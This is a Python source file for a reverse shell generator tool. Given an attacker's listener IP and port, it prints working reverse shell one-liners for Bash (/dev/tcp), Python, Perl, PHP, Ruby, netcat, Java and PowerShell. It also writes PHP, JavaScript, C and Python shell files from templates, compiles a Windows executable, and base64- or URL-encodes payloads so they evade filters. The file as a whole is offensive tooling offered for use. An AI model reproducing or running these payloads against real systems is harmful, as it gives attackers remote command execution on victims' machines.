#!/usr/bin/env python3
#sudo apt-get install gcc-mingw-w64
#sudo apt-get install mingw-w64

import time
import argparse
import sys
import os
import base64
import binascii
import urllib.parse

class Reverse_Shell_Generator:
        def __init__(self):
            self.control()
            self.Selcet()
        def Selcet(self):
            if "python" in self.args.type and not self.args.onefile :
                if not self.args.windows:
                   self.result = "python3 -c "\
                          +"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\
                          +'"'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'\
                          +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("+'"/bin/bash"'+')'+"'"
                else:
                    if self.args.windows:
                         self.result = 'python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('\
                                       +f'{self.args.LHOST}'+","+f'{self.args.LPORT}'\
                                       +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\
                                       os.dup2(s.fileno(),2);p=subprocess.call(['C:\WINDOWS\system32\cmd.exe']);"
                self.Base64()
            
            elif "bash" in self.args.type:
                    self.result=  "bash -i >& /dev/tcp/"+f'{self.args.LHOST}'+"/"+f'{self.args.LPORT}'+" 0>&1" 
                    self.Base64() 
            elif "perl" in self.args.type:
                 self.result = "perl -e 'use Socket;$i="+f'{self.args.LHOST}'\
                        +";$p="+f'{self.args.LPORT}'+";socket(S,PF_INET,SOCK_STREAM,getprotobyname("\
                        +'"tcp"'+"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"+'">&S"'\
                        +");open(STDOUT,"+'">&S"'+");open(STDERR,"+'">&S"'+");exec("+'"sh -i"'+");};'"
                 self.Base64()
               
            elif 'php' in self.args.type and not  self.args.pentestmonkey:
                 
                 self.result = "php -r '$sock=fsockopen("+'"'+f'{self.args.LHOST}'\
                         +'"'+","+f'{self.args.LPORT}'+");exec("\
                         +'"/bin/sh -i <&3 >&3 2>&3"'+");'"
                 self.Base64() 
             
            elif 'ruby' in self.args.type:
                 self.result = "ruby -rsocket -e'f=TCPSocket.open("+'"'\
                        +f'{self.args.LHOST}'+'"'+","+f'{self.args.LPORT}'\
                        +").to_i;exec sprintf("+'"/bin/sh -i <&%d >&%d 2>&%d"'\
                        +",f,f,f)"+"'"
                 self.Base64() 
                
            elif 'netcat' in self.args.type or 'nc' in self.args.type:
                 if not self.args.windows:
                       self.result = "nc -e /bin/sh"+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
                 else:
                     if self.args.windows:
                       self.result = "nc.exe -e cmd "+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
                 self.Base64()
                 self.URL_encode() 
            elif 'xterm' in self.args.type:
                 self.result = 'xterm -display '+f'{self.args.LHOST}'+':'+f'{self.args.LPORT}'
                 self.Base64() 
                 
            elif 'java' in self.args.type  and len(self.args.type)==4:
                  self.result = 'self.result = Runtime.getRuntime()'+'\n'+'process = self.result.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'\
                           +f'{self.args.LHOST}'+'/'+f'{self.args.LPORT}'+';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'\
                           +'\n'+'process.waitFor()'
                  self.Base64()   
                    
            elif 'powershell'  in self.args.type:
                 self.result = '$client = New-Object System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'    
                 self.Base64()
            
            elif 'php' in self.args.type  and self.args.pentestmonkey :
                  if os.path.exists('./Store_shell/PHP.php'):
                     os.remove("./Store_shell/PHP.php")
                  else:
                       pass
                  LHOST = "$ip =  '"+f'{self.args.LHOST}'+"';"
                  LPORT = "$port = "+f'{self.args.LPORT}'+';'
                  Linux = """$shell = 'uname -a; w; id; /bin/sh -i';"""
                  windows = """$shell = 'uname -a; w; id; cmd -i';"""
                  with open ('./resources/pentestmonkey.txt' ,'r') as Monkey:
                             read_php = Monkey.readlines()
      
                  for line in read_php:
                      if self.args.windows: 
                         line = line.replace("$ip = 'LHOST';",LHOST)
                         line = line.replace("$port = LPORT;",LPORT) 
                         line = line.replace(Linux,windows)
                      else: 
                         line = line.replace("$ip = 'LHOST';",LHOST)
                         line = line.replace("$port = LPORT;",LPORT)     
                      with open('./Store_shell/PHP.php','a') as PHP_shell :
                           write_shell = PHP_shell.write(line)   
            elif 'js' in self.args.type and len(self.args.type)==2:
                  if os.path.exists('./Store_shell/javascript.js'):
                     os.remove("./Store_shell/javascript.js")
                  else:
                       pass
                  Orgenal_Host = """"var host = 'LHOST';" +"""
                  Oragenal_port = """"var port = LPORT;" +"""
                  LHOST = '"var host = '+f'{self.args.LHOST}'+'";'+"+"
                  LPORT = '"var port =  '+f'{self.args.LPORT}'+';'+'"+'
                  Linux = """"var cmd = '/bin/bash';"+"""
                  windows= """"var cmd = 'cmd';"+"""
                  with open ('./resources/jvscipt' ,'r') as javascript:
                             read_php = javascript.readlines()
                  for line in read_php:
                      if self.args.windows:                  
                         line = line.replace(Orgenal_Host,LHOST)
                         line = line.replace(Oragenal_port,LPORT)
                         line = line.replace(Linux,windows)
                      else:
                           line = line.replace(Orgenal_Host,LHOST)
                           line = line.replace(Oragenal_port,LPORT)  
                      with open('./Store_shell/javascript.js','a') as PHP_shell :
                           write_shell = PHP_shell.write(line)    
            elif 'exe' in self.args.type and len(self.args.type)==3:
                  if os.path.exists('./Store_shell/shell.c'):
                     os.remove("./Store_shell/shell.c")
                  else:
                       pass
                  Orgenal_Host = """char host[] = "LHOST";"""
                  Oragenal_port = "int port = LPORT;"
                  LHOST = 'char host[] ="'+f'{self.args.LHOST}'+'";'
                  LPORT = 'int port ='+f'{self.args.LPORT}'+';'
                  with open ('./resources/c.txt' ,'r') as shell_exe:
                             read_php = shell_exe.readlines()
                  for line in read_php:
                      line = line.replace(Orgenal_Host,LHOST)
                      line = line.replace(Oragenal_port,LPORT)  
                      with open('./Store_shell/shell.c','a') as PHP_shell :
                           write_shell = PHP_shell.write(line)   
                  if self.args.compile32:
                     os.system("i686-w64-mingw32-g++ ./Store_shell/shell.c -o ./Store_shell/shell32.exe -lws2_32 -lwininet -s\
                                -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")                  
                  os.remove("./Store_shell/shell.c")
            
            elif 'python' in self.args.type and self.args.windows  and self.args.onefile :
                  if os.path.exists('./Store_shell/pyshellwindows.py'):
                     os.remove("./Store_shell/pyshellwindows.py")
                  else:
                       pass
                  Orgenal_Host = "LHOST = ''"
                  Oragenal_port = "LPORT = 0"
                  LHOST = "LHOST = '"+f'{self.args.LHOST}'+"'"
                  LPORT = "LPORT = "+f'{self.args.LPORT}'
                  with open ('./resources/pythonshellwindows.txt' ,'r') as pywin:
                             read_php = pywin.readlines()
                  for line in read_php:
                      line = line.replace(Orgenal_Host,LHOST)
                      line = line.replace(Oragenal_port,LPORT)  
                      with open('./Store_shell/pyshellwindows.py','a') as PY_shell :
                           write_shell = PY_shell.write(line)
            elif 'python' in self.args.type and  not self.args.windows  and self.args.onefile :
                  print("q")
                   
                  if os.path.exists("./Store_shell/pyshellLinux.txt"):
                     os.remove("./Store_shell/pyshellLinux.txt")
                  else:
                       pass
                  Orgenal_Host = "LHOST = ''"
                  Oragenal_port = "LPORT = 0"
                  LHOST = "LHOST = '"+f'{self.args.LHOST}'+"'"
                  LPORT = "LPORT = "+f'{self.args.LPORT}'
                  with open ('./resources/pyshellLinux.txt' ,'r') as pylin:
                             read_php =pylin.readlines()
                  for line in read_php:
                      line = line.replace(Orgenal_Host,LHOST)
                      line = line.replace(Oragenal_port,LPORT)  
                      with open('./Store_shell/pyshellLinux.py','a') as PY_shell :
                           write_shell = PY_shell.write(line)                 
                           
        def control(self):    
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
            parser.add_argument("-t",'--type'            , metavar='' , action=None  ,required = True ,help   ="type of payload ") 
            parser.add_argument("-i","--LHOST"           , metavar='' , action=None  ,required = True ,help   ="listner ip ' Local Host'") 
            parser.add_argument("-p","--LPORT"           , metavar='' , action=None  ,required = True ,help   ="Listner port ")   
            parser.add_argument("-o","--output"          , action='store_true'                        ,help   ="save the payload into the file")      
            parser.add_argument("-B64","--base64"        , action='store_true'                        ,help   ="encode the payload to base64 encode ")  
            parser.add_argument("-M","--pentestmonkey"   , action='store_true'                        ,help   ="genteate php pentestmonkey payload file ") 
            parser.add_argument("-W","--windows"         , action='store_true'                        ,help   ="gentate reverseshell  for windows operating system ")
            parser.add_argument("-C32","--compile32"     , action='store_true'                        ,help   ="compile C code to exe executable 32 bit ")
            parser.add_argument("-F","--onefile"         , action='store_true'                        ,help   ="genetate python script revelshell  ")
            parser.add_argument("-UD","--urlencode"      , action='store_true'                        ,help   ="encode url format ")
            self.args = parser.parse_args()         
            if len(sys.argv)!=1 :
               pass
            else:
               parser.print_help()         
               exit()
        def Base64(self):
             if self.args.base64 :
                  if 'powershell' in self.args.type:
                       self.result = 'powershell -e "'+ base64.b64encode(self.result.encode('utf-16')[2:]).decode()+'"'
                       print(self.result)
                  else:
                      self.result = bytes(self.result.encode())
                      self.result = base64.b64encode(self.result)
                      self.result = str(self.result).replace("b'",'',1).replace("'",'')
                      print(self.result)
             elif self.args.urlencode :
                  self.URL_encode()       
             else:
                  print(self.result)
             if self.args.output:
                with open("./Store_shell/"+self.args.type+".txt",'w') as File_write :
                     File_write.write(self.result)     
        def URL_encode (self):
            if self.args.urlencode :
                 self.result = urllib.parse.quote(self.result)
                 print(self.result)
            if self.args.output:
                with open("./Store_shell/"+self.args.type+".txt",'w') as File_write :
                     File_write.write(self.result)           
if __name__=='__main__':
   Reverse_Shell_Generator()  



